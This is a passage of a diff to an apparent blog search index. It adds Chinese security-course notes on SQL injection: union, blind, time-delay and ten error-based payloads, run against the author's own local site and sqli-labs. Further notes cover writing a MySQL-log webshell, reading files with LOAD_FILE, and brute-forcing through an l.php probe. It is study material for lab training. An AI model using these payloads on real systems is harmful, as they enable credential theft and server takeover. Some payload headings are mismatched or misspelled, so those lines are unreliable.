information_schema.tables for xml path(‘’);</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190907033334781.png" alt></p><h1 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h1><h2 id="按注入类型"><a href="#按注入类型" class="headerlink" title="按注入类型"></a>按注入类型</h2><p>1。数字型注入<br>2。字符串型注入</p><h2 id="按请求方式"><a href="#按请求方式" class="headerlink" title="按请求方式"></a>按请求方式</h2><p>1。GET方式<br>2。POST方式</p><h2 id="按页面反馈"><a href="#按页面反馈" class="headerlink" title="按页面反馈"></a>按页面反馈</h2><p>1。union类型注入<br>2。布尔类型注入<br>3。多语句注入<br>4。内联注入</p><h2 id="按布尔类型"><a href="#按布尔类型" class="headerlink" title="按布尔类型"></a>按布尔类型</h2><p>1。布尔注入<br>2。时间延时注入</p><h2 id="按照数据库类型"><a href="#按照数据库类型" class="headerlink" title="按照数据库类型"></a>按照数据库类型</h2><p>1。MySQL数据库注入<br>2。SQLServer数据库注入<br>3。Oracle数据库注入<br>4。Access数据库注入<br>5。Mongodb数据库注入</p><h1 id="SQL注入漏洞的判断"><a href="#SQL注入漏洞的判断" class="headerlink" title="SQL注入漏洞的判断"></a>SQL注入漏洞的判断</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>SQL语句如果出现问题，会有回显。如果编码隐藏了错误回显，就根据程序执行后显示的不同结果进行判断。当出现不正常显示时，想办法将显示结果正常，如果成功就说明有注入的漏洞。<br>如果错误不能恢复正常则说明没有注入漏洞。</p><h2 id="关于MySQL数据库中information-schema库中的三个表"><a href="#关于MySQL数据库中information-schema库中的三个表" class="headerlink" title="关于MySQL数据库中information_schema库中的三个表"></a>关于MySQL数据库中information_schema库中的三个表</h2><h3 id="columns"><a href="#columns" class="headerlink" title="columns"></a>columns</h3><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062125729.png" alt></p><h3 id="tables"><a href="#tables" class="headerlink" title="tables"></a>tables</h3><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062142233.png" alt></p><h3 id="schemata"><a href="#schemata" class="headerlink" title="schemata"></a>schemata</h3><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062154465.png" alt></p><h3 id="大致的选择"><a href="#大致的选择" class="headerlink" title="大致的选择"></a>大致的选择</h3><p>如果只是简单的查询数据库中的表，优先选择schemata<br>如果需要详细查询数据可以选择，columns<br>如果不需要列名的查询，可以选择tables</p><h1 id="SQL注入实际操作"><a href="#SQL注入实际操作" class="headerlink" title="SQL注入实际操作"></a>SQL注入实际操作</h1><h2 id="以自己写的网站为例"><a href="#以自己写的网站为例" class="headerlink" title="以自己写的网站为例"></a>以自己写的网站为例</h2><h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062611925.png" alt><br>怀疑有注入点，F12进入hackbar，数字型 -1 验证猜测是否正确<br><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062625311.png" alt><br>发现新闻页面改变，确定是数字型注入点使用order by 确定列<br><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062646066.png" alt><br>语法错误，二分法确定列数<br><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062657006.png" alt><br>确定为6列<br>执行Union联合查询获取数据库信息<br><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062706069.png" alt><br>确定6、5、3、4列可用</p><pre><code>Union select 1,2,3,version(),database(),user()</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062714597.png" alt></p><pre><code>http://127.0.0.1/xiangmu/xinwen/yemianzhanshi.php?id=38  and 0 UNION SELECT 1,2,3,4,5,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;item&#39;)</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062737576.png" alt><br>或者使用database() 代替 ‘item’ 查询<br><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062748753.png" alt></p><pre><code>或者hex查询 代替使用database()http://127.0.0.1/xiangmu/xinwen/yemianzhanshi.php?id=38  and 0 UNION SELECT 1,2,3,4,5,(select group_concat(table_name) from information_schema.tables where table_schema=0x6974656d) </code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062832815.png" alt></p><pre><code>查列名http://127.0.0.1/xiangmu/xinwen/yemianzhanshi.php?id=38  and 0 UNION SELECT 1,2,3,4,5,(select group_concat(column_name) from information_schema.columns where table_schema = &#39;item&#39; and table_name = &#39;users&#39;)</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062856052.png" alt></p><pre><code>查数据http://127.0.0.1/xiangmu/xinwen/yemianzhanshi.php?id=38  and 0 UNION SELECT 1,2,3,4,5,(select group_concat(id,0x7e,uname,0x7e,passwd,0x7e,email,0x7e) from item.users)</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062912751.png" alt></p><h3 id="单引号注入"><a href="#单引号注入" class="headerlink" title="单引号注入"></a>单引号注入</h3><p>确定6列<br>1234’ and 0 order by 6 #’<br><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063016778.png" alt></p><pre><code>输出表1234&#39; and 0 UNION SELECT 1,2,3,4,5,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;item&#39;)#&#39;</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063035581.png" alt></p><pre><code>输出列1234&#39; and 0 UNION SELECT 1,2,3,4,5,(select group_concat(column_name) from information_schema.columns where table_schema = &#39;item&#39; and table_name = &#39;users&#39;) #</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063053492.png" alt></p><pre><code>查询数据    1234&#39; and 0 UNION SELECT 1,2,3,4,5,(select group_concat(id,0x7e,uname,0x7e,passwd,0x7e,email,0x7e) from item.users) #</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063109089.png" alt></p><h3 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h3><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><p>通过true和false判断，变相导出数据库的数据<br>相对而言，需要确定，查询的数据库字符串长度，二分法确定字符串。对于ASCII字符转换成HEX进制二分法即可确定字符。如果是Unicode字符串需要相应的函数转换后使用二分法确定字符串。只是相对ASCII更麻烦而以</p><h4 id="查询库名"><a href="#查询库名" class="headerlink" title="查询库名"></a>查询库名</h4><pre><code>对information_schema数据库进行查询select schema_name from information_sechma.schemata limit 0,1    取出第一行的数据</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063517834.png" alt></p><pre><code>计算该数据的长度select Length((select schema_name from information_schema.schemata limit 2,1));</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063537401.png" alt></p><pre><code>在注入点盲注二分法猜测字符串长度（注意点：使用盲注查询的顺序可能和数据库控制台查询的顺序不一致）http://192.168.100.17/xiangmu/xinwen/yemianzhanshi.php?id=36 and  length((select schema_name from information_schema.schemata limit 1,1))&gt;5—l</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063550078.png" alt></p><pre><code>先取出该字段的第一个字符mid((select schema_name from information_schema.schemata limit 1,1),1,1);使用ASCII比较获取数据字符串ascii(mid((select schema_name from information_schema.schemata limit 1,1),1,1));确定该字符ASCII是105    ihttp://192.168.100.17/xiangmu/xinwen/yemianzhanshi.php?id=36 and  ascii(mid((select schema_name from information_schema.schemata limit 1,1),1,1))&gt;105-- l查询第二个字符串ASCII是 116  tascii(mid((select schema_name from information_schema.schemata limit 1,1),2,1))&gt;116-- l根据后台数据库推出该数据库名为item数据库</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063610924.png" alt></p><h4 id="根据数据库名查询数据库下的表名"><a href="#根据数据库名查询数据库下的表名" class="headerlink" title="根据数据库名查询数据库下的表名"></a>根据数据库名查询数据库下的表名</h4><pre><code>数据库后台的运行代码select table_name from information_schema.tables where table_schema=&#39;item&#39;;</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063645366.png" alt></p><pre><code>使用SQL盲注1．    选择第一行的数据    a)    select table_name from information_schema.tables where table_schema=&#39;item&#39; limit 0,1;2．    计算第一行数据的长度    a)    length((select table_name from information_schema.tables where table_schema=&#39;item&#39; limit 0,1));取定字符串长度为7</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063659349.png" alt></p><pre><code>    b)    使用mid截取字符串的第一个字符mid((select table_name from information_schema.tables where table_schema=&#39;item&#39; limit 0,1),1,1);    c)    使用ascii判断该字符的ascii值ascii(mid( (select table_name from information_schema.tables where table_schema=&#39;item&#39; limit 0,1),1,1));确定该ASCII字符是112     p    d)    依此类推确定该字符串是 pinglun 字符串</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063714893.png" alt></p><h4 id="根据表名确定表内的-列名-信息"><a href="#根据表名确定表内的-列名-信息" class="headerlink" title="根据表名确定表内的 列名 信息"></a>根据表名确定表内的 列名 信息</h4><pre><code>1．    查询列名的语句    a)    select column_name from information_schema.columns where table_schema=&#39;item&#39; and table_name=&#39;pinglun&#39;;</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063809937.png" alt></p><pre><code>    b)    选取第一个计算长度length((select column_name from information_schema.columns where table_schema=&#39;item&#39; and table_name=&#39;pinglun&#39; limit 0,1));    c)    使用mid函数一次选取字符串mid((select column_name from information_schema.columns where table_schema=&#39;item&#39; and table_name=&#39;pinglun&#39; limit 0,1),1,1);    d)    使用ascii依次判断字符ascii(mid((select column_name from information_schema.columns where table_schema=&#39;item&#39; and table_name=&#39;pinglun&#39; limit 0,1),1,1));最终确定该字符串是    pid</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063821821.png" alt></p><h4 id="根据列名信息查询表内的数据"><a href="#根据列名信息查询表内的数据" class="headerlink" title="根据列名信息查询表内的数据"></a>根据列名信息查询表内的数据</h4><pre><code>1．    后台数据库，数据查询    a)    select pid from item.pinglun ; 或者查询所有数据 select * from item.pinglun        i.    使用concat合并成单列多行（group_concat合并成单列单行）    b)    计算第一行的长度length((select pid from item.pinglun limit 0,1));    c)    使用mid依次获取字符串mid((select pid from item.pinglun limit 0,1),1,1);    d)    使用ascii函数依次判断字符串ascii(mid((select pid from item.pinglun limit 0,1),1,1));最后确定该数据是 1</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063856201.png" alt></p><pre><code>至此通过 infromation_schema数据库中columns表中的 table_schema  存储的数据库名table_name    相应的数据库中的表名column_name  相应的数据库中的表名中包含的所有列名查询完成对该数据库的结构掌握，依次为依据完成对数据库的盲注。    注意：这只适用于mysql5.0版本以上，mongdb有相似的存储结构。</code></pre><h3 id="SQL延时盲注"><a href="#SQL延时盲注" class="headerlink" title="SQL延时盲注"></a>SQL延时盲注</h3><pre><code>下面进行SQL延时盲注的操作，以sqli-labs-master的第九关为例1．    首先判断是否存在注入    a)    发现，无论是否添加 ‘ 或 “ 都不引起页面的变化，可能不存在注入    b)    观察页面猜测很可能是简单语句输出，使用 and sleep(3) 看能否引起睡眠，是否存在时间延时注入</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901064024829.png" alt></p><pre><code>    c)    有效则可以确定该处存在 ‘ 时间延时注入2．    开始注入操作  准备：    a)    时间延时注入大体思路和盲注一样，只是对结果的判断从页面的变化该成页面的反应时间。根据页面不同的反应时间判断结果的正确与否，从而导出数据    b)    时间延时的函数有两个        i.    Sleep()：简单的休眠函数        ii.    Benchmark()：重复执行操作，人为的造成页面延时效果1.    Eg：benchmark(10000000,md5(1))    根据电脑性能不同会有延时但时间大体一致    c)    条件控制有两个：        i.    if判断1.    eg：select if((length(version())&gt;3),(sleep(5),0);    判断version()字符串长度是否大于3，是则停顿5秒，否则直接返回</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901064039806.png" alt></p><pre><code>        ii.    case判断    类似于 switch1.    eg：case length(version())&gt;3 when 12 then 12 when 1 then ‘true’ when 0 then ‘false’ end;判断version()字符串是否大于3 当结果是12时输出12，当结果是1时输出true 当结果是0时输出false</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901064055807.png" alt></p><pre><code>     以上通过对条件和时间的判断，结合盲注的特点完成对注入点的时间延时盲注，导出数据库的信息。3．    开始操作（依次：获取数据的行数，单行数据的字符串长度，单行字符串中每个字符的定位）    a)    查询数据库中表的信息        i.    获取schemata表中schemata_name的第一行数据的字符串长度http://192.168.100.90/sqli-labs-master/Less-9/?id=1&#39; and if(length((select schema_name from information_schema.schemata limit 0,1))&gt;5,sleep(3),0)#        ii.    通过ascii和mid函数判断该字符的第一个ascii字符http://192.168.100.90/sqli-labs-master/Less-9/?id=1&#39; and if(ascii(mid((select schema_name from information_schema.schemata limit 0,1),1,1))&gt;5,sleep(3),0)#或者这样写case (ascii(mid(select schema_name from information_schema.schemata limit 0,1))&gt;100) when benchmark(10000000,md5(1)) else 0 end    同时可以使用BurpSuite抓包进行数据的修改,在post数据头的修改中很方便    依此类推即可爆出数据库的相关信息。</code></pre><h3 id="十种报错注入"><a href="#十种报错注入" class="headerlink" title="十种报错注入"></a>十种报错注入</h3><p>摘自《代码审计》</p><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><h5 id="1。floor"><a href="#1。floor" class="headerlink" title="1。floor()"></a>1。floor()</h5><h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><pre><code>必须有三个函数    floor()向下取整    rand()随机数  group by()对查询的相同的项进行分组计数报错的原因：    在group_by()对数据进行分组计数时，floor和rand的结合配上rand()结果*2得到的数据只有0或1，    当group_by遇到1时新建列计数，遇到0时，调用floor()函数再次随机如果结果是1则group_by在插入表项计数时产生主建唯一冲突，报错。</code></pre><p><strong>payload</strong></p><pre><code>Select 1 from (select count(*),concat(user(),floor(rand(0)*2)) x from information_schema.tables group by x)a)</code></pre><h5 id="2。extractvalue"><a href="#2。extractvalue" class="headerlink" title="2。extractvalue()"></a>2。extractvalue()</h5><p><strong>payload</strong></p><pre><code>extractvalue(1,concat(0x5c,(select user())))</code></pre><h5 id="3。updatexml"><a href="#3。updatexml" class="headerlink" title="3。updatexml()"></a>3。updatexml()</h5><p><strong>payload</strong></p><pre><code>updatexml(1,concat(0x5e24,(select user()),0x5e24),1)</code></pre><h5 id="4。geometrycollection"><a href="#4。geometrycollection" class="headerlink" title="4。geometrycollection()"></a>4。geometrycollection()</h5><p><strong>payload</strong></p><pre><code>GeometryCollection((select * from(select * from(select user())a)b))</code></pre><h5 id="5。multipoint"><a href="#5。multipoint" class="headerlink" title="5。multipoint()"></a>5。multipoint()</h5><p><strong>payload</strong></p><pre><code>polygon((select * from(select * from(select user())a)b))</code></pre><h5 id="6。polygon"><a href="#6。polygon" class="headerlink" title="6。polygon()"></a>6。polygon()</h5><p><strong>payload</strong></p><pre><code>multipoint((select * from(select * from(select user())a)b))</code></pre><h5 id="7。multipolygon"><a href="#7。multipolygon" class="headerlink" title="7。multipolygon()"></a>7。multipolygon()</h5><p><strong>payload</strong></p><pre><code>multilinestring((select * from(select * from(select user())a)b))</code></pre><h5 id="8。linestring"><a href="#8。linestring" class="headerlink" title="8。linestring()"></a>8。linestring()</h5><p><strong>payload</strong></p><pre><code>Multipollygon((select * from(select * from(select user())a)b))</code></pre><h5 id="9。multilinestring"><a href="#9。multilinestring" class="headerlink" title="9。multilinestring()"></a>9。multilinestring()</h5><p><strong>payload</strong></p><pre><code>Multipollygon((select * from(select * from(select user())a)b))</code></pre><h5 id="10。exp"><a href="#10。exp" class="headerlink" title="10。exp()"></a>10。exp()</h5><p><strong>payload</strong></p><pre><code>Exp(~(select * from(select user())a))</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> i春秋 </category>
+          
+          <category> SQL注入 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 第七周 </tag>
+            
+            <tag> SQL注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>虚拟机的隔离设置</title>
+      <link href="/2019/09/01/%E5%85%B3%E4%BA%8E%E6%9E%84%E5%BB%BA%E5%AE%8C%E5%85%A8%E9%9A%94%E7%A6%BB%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
+      <url>/2019/09/01/%E5%85%B3%E4%BA%8E%E6%9E%84%E5%BB%BA%E5%AE%8C%E5%85%A8%E9%9A%94%E7%A6%BB%E8%99%9A%E6%8B%9F%E6%9C%BA/</url>
+      
+        <content type="html"><![CDATA[<h1 id="虚拟机的隔离设置"><a href="#虚拟机的隔离设置" class="headerlink" title="虚拟机的隔离设置"></a>虚拟机的隔离设置</h1><p>常备虚拟机环境 win7/win10<br>常备日常工具<br>保存关机快照，每次工作后，初始化。<br>不用来登陆任何相关的帐户。<br>用户名、系统主机名：等标示随机设置<br>对系统进行隔离，不和主机进行任何文件复制操作。<br>配置环境，从官网下载。<br><strong>注意：U盘设备管理器（U盘每次拔插都会有记录）</strong><br>同步系统时间去掉，共享关闭，电池不同步。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> i春秋 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 工具 </tag>
+            
+            <tag> 第七周 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MySQL写入webshell的两种方式</title>
+      <link href="/2019/09/01/MySQL%E5%86%99%E5%85%A5webshell%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E5%BC%8F/"/>
+      <url>/2019/09/01/MySQL%E5%86%99%E5%85%A5webshell%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E5%BC%8F/</url>
+      
+        <content type="html"><![CDATA[<h1 id="日志写入WebShell"><a href="#日志写入WebShell" class="headerlink" title="日志写入WebShell"></a>日志写入WebShell</h1><p>Mysql每执行一个SQL语句，就会把SQL语句写入到文件日志中，但在默认情况下这个选项是关闭的。<br>因此，需要去开启这个选项，在设置日志路径，日志路径设置为网站目录，日志文件名为 .php 结尾的文件。<br>使用菜刀等工具即可。</p><h2 id="参数的设置"><a href="#参数的设置" class="headerlink" title="参数的设置"></a>参数的设置</h2><p>SET GLOBAL general_log=’ON’<br>SET GLOBAL general_log_file=’绝对路径，需要获取网站的绝对路径’</p><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p>在设置参数后就执行sql命令，将一句话等webshell写入到日志，直接连接即可<br>Linux的日志<br><img src="/MySQL%E5%86%99%E5%85%A5webshell%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E5%BC%8F/20190901050452822.png" alt><br>window的日志<br><img src="/MySQL%E5%86%99%E5%85%A5webshell%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E5%BC%8F/20190901051837654.png" alt></p><h1 id="SQL语句使用-写入-读取"><a href="#SQL语句使用-写入-读取" class="headerlink" title="SQL语句使用  写入/读取"></a>SQL语句使用  写入/读取</h1><h2 id="into-dumpfile-、into-outfile-区别"><a href="#into-dumpfile-、into-outfile-区别" class="headerlink" title="into dumpfile()、into outfile()区别"></a>into dumpfile()、into outfile()区别</h2><p>outfile：可以导出多行数据，数据写入到文件时有特殊的格式转换，对导出内中的 \n 等特殊字符进行了转移，并且在文件内容的末尾添加了一个新行<br>dumpfile：只能导出一行数据，保持原来数据格式（可以用来导入二进制数据）</p><h3 id="语句例程"><a href="#语句例程" class="headerlink" title="语句例程"></a>语句例程</h3><p>outfile<br>select ‘a\naa\raaaa’ into outfile ‘/tmp/test.txt’<br>dumpfile<br>select ‘a\naa\raaaa’ into dumpfile ‘/tmp/test.txt’</p><h2 id="load-file-读取"><a href="#load-file-读取" class="headerlink" title="load_file()读取"></a>load_file()读取</h2><p>读取一个文件并将其内容作为字符串返回。</p><h3 id="语句例程-1"><a href="#语句例程-1" class="headerlink" title="语句例程"></a>语句例程</h3><p>SELECT LOAD_FILE(‘/data/test.txt’) AS Result;</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> i春秋 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 第七周 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>phpinfo 和 l.php 文件</title>
+      <link href="/2019/09/01/phpinfor()-%E9%A1%B5%E9%9D%A2%E8%AF%A6%E6%83%85/"/>
+      <url>/2019/09/01/phpinfor()-%E9%A1%B5%E9%9D%A2%E8%AF%A6%E6%83%85/</url>
+      
+        <content type="html"><![CDATA[<h1 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h1><p>显示php服务器的配置信息。<br>输出php当前状态的大量信息，包含了PHP编译选项、启用的扩展、PHP版本、服务器信息和环境变量（如果编译为一个模块的话）、PHP环境变量、操作系统版本信息、path变量、配置选项的本地值和预定义变量。<br>因为每个系统安装的不同，phpinfo()常用于在系统上检查配置和预定义变量。</p><h2 id="常用的"><a href="#常用的" class="headerlink" title="常用的"></a>常用的</h2><p>DOCUMENT_ROOT：查看网站根目录<br>disable_functions：禁用的函数<br>allow_url_fopen：打开远程文件<br>allow_url_include：远程文件包含</p><h1 id="l-php探针文件"><a href="#l-php探针文件" class="headerlink" title="l.php探针文件"></a>l.php探针文件</h1><p>包含了当前系统的详细环境配置。<br>可以在该文件的MySQL数据库检测中，爆破数据库的密码。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> i春秋 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 第七周 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>SQL注入</title>
       <link href="/2019/08/25/SQL%E6%B3%A8%E5%85%A5/"/>
       <url>/2019/08/25/SQL%E6%B3%A8%E5%85%A5/</url>
@@ -15,7 +347,7 @@
           
           <category> i春秋 </category>
           
-          <category> 数据库 </category>
+          <category> SQL注入 </category>
           
       </categories>
       
@@ -167,9 +499,9 @@
       
         <tags>
             
-            <tag> 工具 </tag>
-            
             <tag> 第六周 </tag>
+            
+            <tag> 工具 </tag>
             
         </tags>
       
@@ -196,9 +528,9 @@
       
         <tags>
             
-            <tag> 工具 </tag>
-            
             <tag> 第六周 </tag>
+            
+            <tag> 工具 </tag>
             
         </tags>
       
@@ -357,18 +689,16 @@
           
           <category> i春秋 </category>
           
-          <category> 数据库 </category>
+          <category> SQL注入 </category>
           
       </categories>
       
       
         <tags>
             
-            <tag> 第五周 </tag>
-            
-            <tag> 数据库 </tag>
-            
             <tag> SQL注入 </tag>
+            
+            <tag> 第五周 </tag>
             
         </tags>
       
@@ -388,16 +718,16 @@
           
           <category> i春秋 </category>
           
-          <category> 数据库 </category>
+          <category> SQL注入 </category>
           
       </categories>
       
       
         <tags>
             
-            <tag> 第五周 </tag>
+            <tag> SQL注入 </tag>
             
-            <tag> 数据库 </tag>
+            <tag> 第五周 </tag>
             
         </tags>
       
@@ -822,9 +1152,9 @@
       
         <tags>
             
-            <tag> 工具 </tag>
-            
             <tag> 第三周 </tag>
+            
+            <tag> 工具 </tag>
             
         </tags>
       
@@ -851,9 +1181,9 @@
       
         <tags>
             
-            <tag> 工具 </tag>
-            
             <tag> 第三周 </tag>
+            
+            <tag> 工具 </tag>
             
         </tags>
       
@@ -1067,9 +1397,9 @@
       
         <tags>
             
-            <tag> 工具 </tag>
-            
             <tag> 第三周 </tag>
+            
+            <tag> 工具 </tag>
             
             <tag> 第二周 </tag>
             
